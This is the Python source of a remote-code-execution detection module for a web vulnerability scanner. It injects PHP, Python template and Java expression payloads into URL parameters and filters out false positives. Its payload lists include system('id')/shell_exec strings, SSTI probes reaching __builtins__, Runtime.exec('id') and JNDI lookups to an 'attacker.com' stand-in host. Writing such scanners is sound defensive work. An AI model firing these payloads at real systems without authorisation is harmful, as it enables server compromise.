"""
RCE (Remote Code Execution) Detection Module
Detects: code injection, deserialization RCE, expression injection, file upload RCE

False positive prevention (P5 fix):
- Must use baseline comparison: no-payload request vs with-payload request
- Echo-server detection: filter httpbin and similar echo services
- Input reflection detection: full payload appearing in response != code execution
"""

import logging
import re
import time
import uuid
from typing import List

from ..base import DetectionModule, ModuleInfo
from ..base import register_module
from ...models import Vulnerability, Severity, Confidence, ScanTarget

from .payloads import (
    PYTHON_CODE_INJECTION_PAYLOADS,
    JAVA_EXPRESSION_PAYLOADS,
    TIME_BASED_PAYLOADS,
)

logger = logging.getLogger("wvs.module.rce")


class RCEDetector(DetectionModule):
    """
    RCE Detection Module

    Detection strategies:
    1. Code injection (PHP/Python/Java expressions)
    2. Time-based blind testing (no-echo scenarios)
    3. File upload RCE
    """

    @classmethod
    def get_info(cls) -> ModuleInfo:
        return ModuleInfo(
            name="rce",
            description="Remote Code Execution detection (code injection, deserialization, expression injection)",
            author="WVS Team",
            version="1.0.0",
            enabled_by_default=True,
            tags=["rce", "code-injection", "deserialization", "critical"],
        )

    async def _scan_impl(self, target: ScanTarget) -> List[Vulnerability]:
        """
        RCE detection main logic

        Detection strategies (P6 enhancements):
        1. Fast fingerprint identification: detect tech stack markers in response headers/content
        2. PHP code injection (echo detection + behavioral characteristics detection)
        3. Python SSTI/code injection
        4. Java expression injection
        5. Time-based blind testing (fallback)
        """
        vulns: List[Vulnerability] = []

        params = target.params or {}
        if not params:
            return vulns

        test_token = f"RCE_TEST_{uuid.uuid4().hex[:16].upper()}"

        # P6: Fast server fingerprint — skip irrelevant language tests to save requests
        fp = await self._fingerprint_server(target)

        # 1. PHP code injection detection (echo + behavioral characteristics)
        if fp.get("php", True):  # default True for backward compat
            php_vulns = await self._detect_php_injection(target, test_token)
            vulns.extend(php_vulns)
            if not php_vulns:
                php_behavior_vulns = await self._detect_php_behavior(target)
                vulns.extend(php_behavior_vulns)

        # 2. Python code injection/SSTI detection
        if fp.get("python", True):
            py_vulns = await self._detect_python_injection(target, test_token)
            vulns.extend(py_vulns)

        # 3. Java expression injection detection
        if fp.get("java", True):
            java_vulns = await self._detect_java_expression(target, test_token)
            vulns.extend(java_vulns)

        # 4. Time-based blind testing (fallback — no language filter, since SLEEP is universal)
        time_vulns = await self._detect_time_based(target)
        vulns.extend(time_vulns)

        return vulns

    async def _fingerprint_server(self, target: ScanTarget) -> dict:
        """
        P6: Fast server fingerprint — one baseline request to detect tech stack.
        Returns dict with php/python/java bool flags — skip irrelevant lang tests.
        """
        fp = {"php": True, "python": True, "java": True}  # default: test all
        try:
            resp = await self._active_session.get(target.url, params=target.params, timeout=10)
            if not resp:
                return fp
            headers = {k.lower(): v for k, v in resp.headers.items()}
            text = resp.text[:5000].lower()

            server = headers.get("server", "")
            x_powered = headers.get("x-powered-by", "")

            # PHP indicators
            php_indicators = [".php", "phpsessid", "x-powered-by: php", "php/"]
            has_php = any(
                i in server.lower()
                or i in x_powered.lower()
                or i in text
                or "set-cookie" in headers
                and "phpsessid" in headers.get("set-cookie", "").lower()
                for i in php_indicators
            )
            # Python indicators
            python_indicators = ["python", "django", "flask", "jinja", "werkzeug", "gunicorn", "uvicorn", "tornado", "cherrypy"]
            has_python = any(i in server.lower() or i in x_powered.lower() or i in text for i in python_indicators)
            # Java indicators
            java_indicators = [
                "jsp",
                "servlet",
                "tomcat",
                "jboss",
                "jetty",
                "glassfish",
                "weblogic",
                "websphere",
                "struts",
                "spring",
                "jsessionid",
                ".do",
                ".action",
            ]
            has_java = any(
                i in server.lower()
                or i in x_powered.lower()
                or i in text
                or "set-cookie" in headers
                and "jsessionid" in headers.get("set-cookie", "").lower()
                for i in java_indicators
            )

            # If we positively identified some tech, only test those
            if has_php or has_python or has_java:
                fp["php"] = has_php
                fp["python"] = has_python
                fp["java"] = has_java
        except Exception:
            pass
        return fp

    async def _detect_php_injection(self, target: ScanTarget, test_token: str) -> List[Vulnerability]:
        """Detect PHP code injection — using full PHP_CODE_INJECTION_PAYLOADS library + baseline comparison"""
        vulns: List[Vulnerability] = []
        params = target.params or {}
        if not params:
            return vulns

        # Build token echo payloads (fastest detection method)
        echo_payloads = [
            f"<?php echo '{test_token}'; ?>",
            f"echo '{test_token}';",
            f"print('{test_token}');",
            f"<?= '{test_token}'; ?>",
            f"{{echo '{test_token}'}}",
            f";echo '{test_token}';",
            f"|echo '{test_token}';",
            f"`echo '{test_token}'`",
        ]

        for param_name in list(params.keys()):
            # Baseline: request original params (no payload), confirm page itself does not contain token
            try:
                baseline_resp = await self._active_session.get(
                    target.url,
                    params=params,
                    timeout=10,
                )
            except Exception:
                baseline_resp = None

            baseline_text = baseline_resp.text if baseline_resp else ""
            if test_token in baseline_text:
                continue  # Token already exists in baseline, skip

            # Phase 1: Token echo detection (fast code execution verification)
            for payload in echo_payloads[:5]:
                try:
                    test_params = dict(params)
                    test_params[param_name] = payload

                    resp = await self._active_session.get(
                        target.url,
                        params=test_params,
                        timeout=10,
                    )
                    resp_text = resp.text

                    if test_token not in resp_text:
                        continue

                    # Filter echo-server (httpbin and similar echo services)
                    if self._is_echo_server(target.url, resp_text, payload):
                        logger.debug(f"[RCE] Ignoring echo-server: {target.url}")
                        continue

                    # Filter input reflection: full payload appearing in response != code execution
                    if self._is_input_reflection(resp_text, payload, test_token):
                        logger.debug(f"[RCE] Filtering reflection: {target.url} — payload reflected verbatim")
                        continue

                    # Filter PHP error reflection: LFI endpoint include() PHP warnings != RCE
                    if self._is_php_error_reflection(resp_text, payload, test_token):
                        logger.debug(f"[RCE] Filtering PHP error reflection: {target.url} — token only in PHP error context")
                        continue

                    # Filter LFI context: token may come from PHP file executed via LFI inclusion
                    if self._is_lfi_context(resp_text):
                        logger.debug("[RCE] LFI context detected — token likely from included file, not direct RCE")
                        continue

                    # P11: Filter HTML verbatim-display reflection (token appears in <pre>/<code> display areas)
                    if self._is_html_display_reflection(resp_text, test_token, payload):
                        logger.debug("[RCE] HTML display reflection — token in verbatim/pre context, not code execution")
                        continue

                    # Secondary verification: confirm with different token
                    verify_token = f"VFY_{uuid.uuid4().hex[:12].upper()}"
                    verify_payload = f"<?php echo '{verify_token}'; ?>"
                    verify_params = dict(params)
                    verify_params[param_name] = verify_payload
                    try:
                        vfy_resp = await self._active_session.get(
                            target.url,
                            params=verify_params,
                            timeout=10,
                        )
                        if verify_token not in vfy_resp.text:
                            continue
                        if self._is_input_reflection(vfy_resp.text, verify_payload, verify_token):
                            continue
                        if self._is_php_error_reflection(vfy_resp.text, verify_payload, verify_token):
                            continue
                    except Exception:
                        continue

                    vulns.append(
                        self._create_vulnerability(
                            target=target,
                            param=param_name,
                            payload=payload,
                            evidence=f"Code execution confirmed: token '{test_token}' echoed (not in baseline, not reflected)",
                            severity=Severity.CRITICAL,
                        )
                    )
                    # One RCE finding is enough, break out of outer loop
                    return vulns

                except Exception as e:
                    logger.debug(f"PHP injection test failed: {e}")

        return vulns

    async def _detect_php_behavior(
        self,
        target: ScanTarget,
    ) -> List[Vulnerability]:
        """
        Detect PHP code injection — behavioral characteristics method

        Use phpinfo(), system('id'), eval(), assert() and other payloads,
        detect corresponding behavioral characteristics in response (PHP version info, uid= output, etc.).
        Solves scenarios where token echo method cannot cover eval/assert/system without token output.
        """
        vulns: List[Vulnerability] = []
        params = target.params or {}
        if not params:
            return vulns

        # Extract behavior-detectable payloads from payloads.py
        behavior_payloads = [
            "phpinfo()",
            ";phpinfo();",
            "|phpinfo()",
            "system('id')",
            ";system('id');",
            "exec('id')",
            "shell_exec('id')",
            "eval('phpinfo();')",
            "assert(phpinfo())",
            "call_user_func('phpinfo')",
            "create_function('','phpinfo()')",
            "preg_replace('/.*/e','phpinfo()','test')",
        ]

        for param_name in list(params.keys()):
            # P8: Baseline — check phpinfo indicators aren't already present without injection
            baseline_text = ""
            try:
                baseline_resp = await self._active_session.get(
                    target.url,
                    params=params,
                    timeout=10,
                )
                baseline_text = baseline_resp.text[:10000] if baseline_resp else ""
            except Exception:
                pass

            phpinfo_indicators = [
                "PHP Version",
                "phpinfo()",
                "PHP License",
                "Configuration File (php.ini) Path",
                "PHP Core",
                "Registered PHP Streams",
                "Zend Engine",
                "Configure Command",
            ]
            baseline_score = sum(1 for ind in phpinfo_indicators if ind in baseline_text)
            if baseline_score >= 3:
                continue  # phpinfo output already present without injection

            for payload in behavior_payloads[:6]:
                try:
                    test_params = dict(params)
                    test_params[param_name] = payload

                    resp = await self._active_session.get(
                        target.url,
                        params=test_params,
                        timeout=10,
                    )
                    resp_text = resp.text[:10000]

                    phpinfo_score = sum(1 for ind in phpinfo_indicators if ind in resp_text)
                    if phpinfo_score >= 5 and phpinfo_score > baseline_score + 2:
                        vulns.append(
                            self._create_vulnerability(
                                target=target,
                                param=param_name,
                                payload=payload,
                                evidence=f"phpinfo() output detected ({phpinfo_score} indicators, baseline={baseline_score}): PHP version info exposed in response",  # noqa: E501
                                severity=Severity.CRITICAL,
                            )
                        )
                        return vulns

                    # Detect system('id') output characteristics
                    uid_patterns = [
                        r"uid=\d+\([^)]+\)\s+gid=\d+",
                        r"uid=\d+\([^)]+\)",
                    ]
                    for pat in uid_patterns:
                        if re.search(pat, resp_text):
                            vulns.append(
                                self._create_vulnerability(
                                    target=target,
                                    param=param_name,
                                    payload=payload,
                                    evidence=f"system('id') output detected: {re.search(pat, resp_text).group(0)}",
                                    severity=Severity.CRITICAL,
                                )
                            )
                            return vulns

                    # Detect eval/assert indirect execution characteristics (phpinfo output)
                    if payload in (
                        "eval('phpinfo();')",
                        "assert(phpinfo())",
                        "call_user_func('phpinfo')",
                        "create_function('','phpinfo()')",
                        "preg_replace('/.*/e','phpinfo()','test')",
                    ):
                        if phpinfo_score >= 4 and phpinfo_score > baseline_score + 2:
                            vulns.append(
                                self._create_vulnerability(
                                    target=target,
                                    param=param_name,
                                    payload=payload,
                                    evidence=f"Indirect code execution via {payload}: PHP info exposed (score={phpinfo_score}, baseline={baseline_score})",  # noqa: E501
                                    severity=Severity.CRITICAL,
                                )
                            )
                            return vulns

                except Exception as e:
                    logger.debug(f"PHP behavior test failed: {e}")

        return vulns

    async def _detect_python_injection(self, target: ScanTarget, test_token: str) -> List[Vulnerability]:
        """Detect Python code injection/SSTI — using full PYTHON_CODE_INJECTION_PAYLOADS library"""
        vulns: List[Vulnerability] = []
        params = target.params or {}

        # SSTI quick detection payloads (math operations + echo)
        ssti_payloads = [
            ("{{7*7}}", "49", "SSTI detected: {{7*7}} evaluated to 49"),
            ("${7*7}", "49", "Mako SSTI: ${7*7} evaluated to 49"),
            ("#{7*7}", "49", "SpEL: #{7*7} evaluated to 49"),
            (f"{{{{'{test_token}'}}}}", test_token, f"SSTI token echo: '{test_token}' reflected"),
            (f"${{{test_token}}}", test_token, f"Mako token echo: ${{{test_token}}}"),
            ("{{config}}", None, "SSTI config object leaked"),
            ("{{''.__class__.__mro__[2].__subclasses__()}}", "__subclasses__", "SSTI: __mro__/__subclasses__ exposed"),
            ("{{request.application.__globals__.__builtins__}}", "__builtins__", "SSTI: __builtins__ leaked"),
        ]

        # Append behavioral characteristic payloads from payloads.py
        for py_payload in PYTHON_CODE_INJECTION_PAYLOADS:
            if "system" in py_payload and py_payload not in [p[0] for p in ssti_payloads]:
                ssti_payloads.append((py_payload, None, f"Python code injection: {py_payload[:60]}"))

        # P8: Baseline — avoid matching content already present without injection
        baseline_text = ""
        try:
            baseline_resp = await self._active_session.get(
                target.url,
                params=params,
                timeout=10,
            )
            baseline_text = baseline_resp.text[:10000] if baseline_resp else ""
        except Exception:
            pass

        for param_name, param_value in params.items():
            for payload, expected, evidence_base in ssti_payloads[:12]:
                try:
                    test_params = dict(params)
                    test_params[param_name] = payload

                    resp = await self._active_session.get(
                        target.url,
                        params=test_params,
                        timeout=10,
                    )

                    # P8: Check expected output with baseline comparison
                    if expected and expected in resp.text:
                        # Baseline check: if expected value already exists without injection -> FP
                        if expected in baseline_text and expected == "49":
                            continue  # "49" already in baseline (page number, ID, etc.)
                        vulns.append(
                            self._create_vulnerability(
                                target=target,
                                param=param_name,
                                payload=payload,
                                evidence=evidence_base,
                                severity=Severity.CRITICAL,
                            )
                        )
                        return vulns

                    # Echo detection
                    if test_token in resp.text and not self._is_input_reflection(resp.text, payload, test_token):
                        vulns.append(
                            self._create_vulnerability(
                                target=target,
                                param=param_name,
                                payload=payload,
                                evidence=f"Token '{test_token}' found in response (Python/SSTI injection)",
                                severity=Severity.CRITICAL,
                            )
                        )
                        return vulns

                    # Check SSTI leak characteristics (__subclasses__, __globals__, __builtins__)
                    ssti_leak_indicators = [
                        "__subclasses__",
                        "__globals__",
                        "__builtins__",
                        "__mro__",
                        "__bases__",
                        "__class__",
                    ]
                    for indicator in ssti_leak_indicators:
                        if indicator in resp.text and indicator in payload:
                            vulns.append(
                                self._create_vulnerability(
                                    target=target,
                                    param=param_name,
                                    payload=payload,
                                    evidence=f"SSTI object leaked: {indicator} exposed in response",
                                    severity=Severity.CRITICAL,
                                )
                            )
                            return vulns

                except Exception as e:
                    logger.debug(f"Python injection test failed: {e}")

        return vulns

    async def _detect_java_expression(self, target: ScanTarget, test_token: str) -> List[Vulnerability]:
        """Detect Java expression injection (EL/OGNL/SpEL) — using full JAVA_EXPRESSION_PAYLOADS library"""
        vulns: List[Vulnerability] = []
        params = target.params or {}

        java_payloads = [
            # EL math operations (fastest detection)
            ("${7*7}", "49", "EL expression: ${7*7} evaluated to 49"),
            ("#{7*7}", "49", "SpEL: #{7*7} evaluated to 49"),
            # EL context leak
            ("${applicationScope}", "ServletContext", "EL context leak: applicationScope exposed"),
            ("${pageContext}", "ServletContext", "EL context leak: pageContext exposed"),
            # JNDI injection
            ("${jndi:ldap://attacker.com/exploit}", None, "JNDI injection probe"),
            ("${jndi:rmi://attacker.com/exploit}", None, "JNDI RMI injection probe"),
            # Runtime.exec probe
            ("${Runtime.getRuntime().exec('id')}", "uid=", "EL RCE: Runtime.exec('id') output detected"),
        ]

        # Append OGNL/SpEL payloads from payloads.py
        for java_payload in JAVA_EXPRESSION_PAYLOADS:
            if java_payload not in [p[0] for p in java_payloads]:
                java_payloads.append((java_payload, None, f"Java expression: {java_payload[:60]}"))

        # P8: Baseline — avoid matching content already present without injection
        baseline_text = ""
        try:
            baseline_resp = await self._active_session.get(
                target.url,
                params=params,
                timeout=10,
            )
            baseline_text = baseline_resp.text[:10000] if baseline_resp else ""
        except Exception:
            pass

        for param_name, param_value in params.items():
            for payload, expected, evidence_base in java_payloads[:10]:
                try:
                    test_params = dict(params)
                    test_params[param_name] = payload

                    resp = await self._active_session.get(
                        target.url,
                        params=test_params,
                        timeout=10,
                    )
                    resp_text = resp.text[:10000]

                    # Expression math result detection
                    if expected and expected in resp_text and expected != "49":
                        # P8: Baseline check — if indicator exists without injection, it's not RCE
                        if expected in baseline_text:
                            continue
                        vulns.append(
                            self._create_vulnerability(
                                target=target,
                                param=param_name,
                                payload=payload,
                                evidence=evidence_base,
                                severity=Severity.CRITICAL if "exec" in payload else Severity.HIGH,
                            )
                        )
                        return vulns
                    elif expected == "49" and re.search(r"\b49\b", resp_text):
                        # P8: Baseline check — "49" may be page number, ID, year, etc.
                        if re.search(r"\b49\b", baseline_text):
                            continue
                        vulns.append(
                            self._create_vulnerability(
                                target=target,
                                param=param_name,
                                payload=payload,
                                evidence=evidence_base,
                                severity=Severity.CRITICAL,
                            )
                        )
                        return vulns

                    # P8: EL/OGNL/SpEL context leak detection — require baseline absent + multi-indicator
                    el_leak_indicators = [
                        "ServletContext",
                        "applicationScope",
                        "pageContext",
                        "javax.servlet",
                        "org.apache",
                        "java.lang.Runtime",
                        "ProcessBuilder",
                        "org.springframework",
                    ]
                    el_leak_count = 0
                    first_indicator = None
                    for indicator in el_leak_indicators:
                        if indicator in resp_text and indicator not in baseline_text:
                            el_leak_count += 1
                            if first_indicator is None:
                                first_indicator = indicator
                    if el_leak_count >= 2:
                        vulns.append(
                            self._create_vulnerability(
                                target=target,
                                param=param_name,
                                payload=payload,
                                evidence=f"Java EL leak: {el_leak_count} indicators exposed ({first_indicator}...) — payload: {payload[:50]}",
                                severity=Severity.HIGH,
                            )
                        )
                        return vulns

                except Exception as e:
                    logger.debug(f"Java expression test failed: {e}")

        return vulns

    async def _detect_time_based(self, target: ScanTarget) -> List[Vulnerability]:
        """Time-based blind testing (no-echo scenarios) — using TIME_BASED_PAYLOADS + baseline measurement"""
        vulns: List[Vulnerability] = []
        params = target.params or {}
        if not params:
            return vulns

        for param_name, param_value in params.items():
            # Measure baseline response time
            baseline_avg, baseline_std = await self._measure_baseline(
                "GET",
                target.url,
                params,
                "query",
            )
            if self._should_skip_time_based(baseline_avg, baseline_std):
                continue

            for lang, payloads in TIME_BASED_PAYLOADS.items():
                for payload in payloads[:2]:
                    try:
                        test_params = dict(params)
                        test_params[param_name] = payload

                        start = time.monotonic()
                        resp = await self._active_session.get(
                            target.url,
                            params=test_params,
                            timeout=20,
                        )
                        elapsed = time.monotonic() - start

                        # Parse expected delay (sleep(3) -> 3, sleep(5) -> 5, timeout 5 -> 5)
                        expected_delay = 3
                        import re as _re

                        delay_match = _re.search(r"sleep\s*\(?\s*(\d+)", payload)
                        if delay_match:
                            expected_delay = int(delay_match.group(1))

                        if resp and self._is_valid_time_delay(elapsed, expected_delay, baseline_avg):
                            verify_payloads = [
                                p
                                for plist in TIME_BASED_PAYLOADS.values()
                                for p in plist[:2]
                                if f"sleep({expected_delay})" in p or f"sleep {expected_delay}" in p
                            ][:3]
                            if not verify_payloads:
                                verify_payloads = [
                                    f"sleep({expected_delay})",
                                    f";sleep({expected_delay});",
                                    f"`sleep {expected_delay}`",
                                ]

                            if await self._verify_time_based(
                                target.url,
                                params,
                                param_name,
                                "GET",
                                "query",
                                expected_delay,
                                baseline_avg,
                                verify_payloads,
                            ):
                                vulns.append(
                                    self._create_vulnerability(
                                        target=target,
                                        param=param_name,
                                        payload=payload,
                                        evidence=f"Time-based RCE ({lang}): response delayed {elapsed:.2f}s (baseline={baseline_avg:.2f}s, expected ~{expected_delay}s)",  # noqa: E501
                                        severity=Severity.HIGH,
                                        confidence=Confidence.MEDIUM,
                                    )
                                )
                                return vulns

                    except Exception as e:
                        logger.debug(f"Time-based test failed: {e}")

        return vulns

    def _is_input_reflection(self, resp_text: str, payload: str, token: str) -> bool:
        """
        Detect if it is input reflection (payload echoed verbatim), rather than code execution.
        Real RCE: only token appears in response (code executed, echo output token)
        False positive: full payload appears in response, removing payload also removes token

        Note: Must remove ALL occurrences of payload, because PHP include() errors
        reflect the payload twice in warning messages (function parameter + error description string),
        removing only one occurrence leaves token in the second occurrence.
        """
        if payload in resp_text:
            stripped = resp_text.replace(payload, "")
            if token not in stripped:
                return True
        # P11: Also detect when token appears ONLY inside the reflected payload text
        # e.g. HTML page shows "You entered: <?php echo 'TOKEN'; ?>" — token is inside
        # the reflected payload, not independently echoed by code execution
        if token in resp_text:
            # Find all positions of token in response
            import re as _re

            token_positions = [m.start() for m in _re.finditer(_re.escape(token), resp_text)]
            payload_positions = [m.start() for m in _re.finditer(_re.escape(payload), resp_text)]
            # If every token occurrence falls within a payload reflection, it's FP
            all_inside_reflection = True
            for tp in token_positions:
                inside = any(pp <= tp < pp + len(payload) for pp in payload_positions)
                if not inside:
                    all_inside_reflection = False
                    break
            if all_inside_reflection and payload_positions:
                return True
        return False

    def _is_php_error_reflection(self, resp_text: str, payload: str, token: str) -> bool:
        """
        Detect if token only appears in PHP error/warning context (LFI endpoint false positive).

        When LFI endpoints use include()/require(), the injected RCE payload gets
        processed by PHP as a filename, producing warnings like:
          Warning: include(echo 'TOKEN';): failed to open stream ...
        This response does NOT indicate code execution — it's just PHP error reflecting input.

        Also supports plain text and HTML formatted (<b>Warning</b>:) PHP error messages.
        P11: Added PHP 5.x legacy error format support (Metasploitable2 scenario).
        """
        # Quick check: does the response have PHP error characteristics?
        quick_checks = [
            r"Warning[<\s:]",  # "Warning:", "<b>Warning</b>:"
            r"Fatal error[<\s:]",
            r"Notice[<\s:]",
            r"failed to open stream",
            r"failed opening.*for inclusion",
            # P11: PHP 5.x / Metasploitable2 specific error formats
            r"failed to open stream:",
            r"No such file or directory in",
            r"on line\s+\d+",
            r"\.php</b> on line",
        ]
        if not any(re.search(p, resp_text, re.IGNORECASE) for p in quick_checks):
            return False

        # Confirm it's an include/require file operation error (not other PHP errors)
        php_func_error = (
            re.search(r"include\s*\(.*\)", resp_text, re.IGNORECASE)
            or re.search(r"require\s*\(.*\)", resp_text, re.IGNORECASE)
            or re.search(r"file_get_contents\s*\(.*\)", resp_text, re.IGNORECASE)
        )
        php_stream_error = re.search(r"failed to open stream|failed opening", resp_text, re.IGNORECASE)
        # P11: Also detect when PHP error line contains the payload/token as filename
        php_error_with_payload = re.search(r"failed to open stream:.*" + re.escape(payload[:30]), resp_text, re.IGNORECASE) or re.search(
            r"failed to open stream:.*" + re.escape(token[:16]), resp_text, re.IGNORECASE
        )
        if not (php_func_error or php_stream_error or php_error_with_payload):
            return False

        # After removing all PHP error lines, check if token still exists
        error_line_patterns = [
            r"Warning[<\s:]",
            r"Fatal error[<\s:]",
            r"Notice[<\s:]",
            r"failed to open stream",
            r"failed opening",
            r"on line \d+",
            r"in <b>",
            r"\.php</b> on line",
            r"No such file or directory",
            r"include_path=",
        ]
        lines = resp_text.split("\n")
        non_error_lines = [line for line in lines if not any(re.search(p, line, re.IGNORECASE) for p in error_line_patterns)]
        non_error_text = "\n".join(non_error_lines)

        if token in resp_text and token not in non_error_text:
            return True

        return False

    def _is_html_display_reflection(self, resp_text: str, token: str, payload: str) -> bool:
        """
        P11: Detect when token only appears in HTML verbatim-display context.

        Some apps echo user input verbatim inside <pre>, <code>, <textarea>,
        or as plaintext debug output. The token appearing there does NOT
        indicate code execution — it's just reflection.

        Returns True if token ONLY exists inside verbatim-display HTML contexts.
        """
        # Extract all token occurrences and their surrounding context
        import re as _re

        verbatim_tags = ["pre", "code", "textarea", "samp", "kbd", "xmp"]

        token_positions = [m.start() for m in _re.finditer(_re.escape(token), resp_text)]
        if not token_positions:
            return False

        all_in_verbatim = True
        for pos in token_positions:
            context_before = resp_text[max(0, pos - 500): pos]
            # Check if token is inside a verbatim tag
            in_verbatim = False
            for tag in verbatim_tags:
                open_tag = f"<{tag}"
                close_tag = f"</{tag}>"
                last_open = context_before.rfind(open_tag)
                last_close = context_before.rfind(close_tag)
                if last_open > last_close:
                    in_verbatim = True
                    break
            # Also check if token is in a "debug output" context
            debug_markers = ["Your input:", "You entered:", "Input was:", "Echo:", "Output:", "Result:", "Value:"]
            if any(m in context_before[-200:] for m in debug_markers):
                in_verbatim = True
            if not in_verbatim:
                all_in_verbatim = False
                break

        return all_in_verbatim

    def _is_lfi_context(self, resp_text: str) -> bool:
        """
        Detect if the response contains LFI file content characteristics, indicating the token
        may have been obtained via LFI including a PHP file, rather than direct RCE.

        When the response simultaneously contains file system content (/etc/passwd, /proc/self/environ,
        win.ini, etc.), it indicates file inclusion behavior, and token execution is a side effect of LFI.
        """
        lfi_indicators = [
            "root:x:0:0:",
            "nobody:x:",
            "daemon:x:",  # /etc/passwd
            "[fonts]",
            "[extensions]",
            "[Mail]",  # win.ini
            "PATH=",
            "HOME=",
            "USER=",
            "SHELL=",  # /proc/self/environ
            "Pid:",
            "Name:",
            "Uid:",  # /proc/self/status
            "[boot loader]",
            "default=",  # boot.ini
        ]
        score = sum(1 for ind in lfi_indicators if ind in resp_text)
        return score >= 2

    def _is_echo_server(self, url: str, resp_text: str, payload: str) -> bool:
        """Detect if target is an echo-server (e.g. httpbin.org), avoid reflection-based false positives."""
        json_indicators = ['"args"', '"url"', '"headers"', '"origin"', '"form"']
        json_score = sum(1 for ind in json_indicators if ind in resp_text)
        if json_score >= 2:
            import re as _re

            quoted = _re.escape(payload)
            if _re.search(f'"[^"]*{quoted}[^"]*"', resp_text):
                return True
        debug_indicators = ["Request Details", "Query String Parameters", "Your Input:", "You entered:", "Debug Information"]
        if any(ind in resp_text for ind in debug_indicators):
            if payload in resp_text:
                return True
        return False

    def _create_vulnerability(
        self,
        target: ScanTarget,
        param: str,
        payload: str,
        evidence: str,
        severity: Severity = Severity.HIGH,
        confidence: Confidence = Confidence.HIGH,
    ) -> Vulnerability:
        """Create a vulnerability object — delegates to base class _create_vuln to ensure unified type mapping"""
        return self._create_vuln(
            url=target.url,
            param=param,
            param_type=target.params and "query" or "body",
            method="GET",
            payload=payload,
            vuln_type="token_echo" if "token" in evidence.lower() else "code_execution",
            severity=severity,
            confidence=confidence,
            evidence=evidence,
            description="Remote code execution vulnerability allows attackers to execute arbitrary code on the server.",
            recommendation=(
                "Avoid using eval(), exec(), system() functions with user input. "
                "Use allowlists for acceptable input. "
                "Implement strict input validation and sanitization."
            ),
            context={
                "references": [
                    "https://owasp.org/www-community/attacks/Code_Injection",
                    "https://portswigger.net/web-security/os-command-injection",
                ],
            },
        )


# Register module
register_module(RCEDetector)
